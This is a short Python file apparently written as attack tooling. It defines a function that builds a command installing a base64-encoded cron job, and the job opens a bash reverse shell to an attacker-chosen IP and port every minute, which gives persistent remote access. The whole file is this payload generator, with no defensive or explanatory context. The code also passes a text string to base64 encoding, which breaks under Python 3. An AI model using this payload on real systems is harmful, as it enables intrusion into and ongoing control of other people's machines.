#!/usr/bin/env python3
import base64
def crontab_reverse(reverse_ip,reverse_port):
    crontab_path = "/tmp"
    cmd = 'bash -i >& /dev/tcp/%s/%d 0>&1'%(reverse_ip , reverse_port)
    crontab_cmd = "* * * * * bash -c '%s'\n"%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf"+ " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    return cmd

